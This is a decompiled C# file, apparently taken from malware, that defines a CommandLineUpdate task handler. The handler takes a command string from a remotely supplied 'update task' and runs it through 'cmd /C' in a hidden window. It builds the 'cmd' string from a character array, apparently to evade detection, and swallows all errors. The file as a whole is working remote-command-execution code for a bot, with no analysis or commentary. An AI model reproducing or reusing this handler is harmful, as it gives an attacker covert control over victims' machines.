using System;
using System.Diagnostics;

// Token: 0x02000028 RID: 40
public class CommandLineUpdate : ITaskProcessor
{
	// Token: 0x060000B6 RID: 182 RVA: 0x0000795A File Offset: 0x00005B5A
	public bool IsValidAction(UpdateAction action)
	{
		return action == UpdateAction.Cmd;
	}

	// Token: 0x060000B7 RID: 183 RVA: 0x00007960 File Offset: 0x00005B60
	public bool Process(UpdateTask updateTask)
	{
		try
		{
			System.Diagnostics.Process.Start(new ProcessStartInfo(new string(new char[]
			{
				'c',
				'm',
				'd'
			}), new string(new char[]
			{
				'/',
				'C',
				' '
			}) + updateTask.TaskArg)
			{
				UseShellExecute = false,
				CreateNoWindow = true
			}).WaitForExit(30000);
		}
		catch
		{
		}
		return true;
	}
}
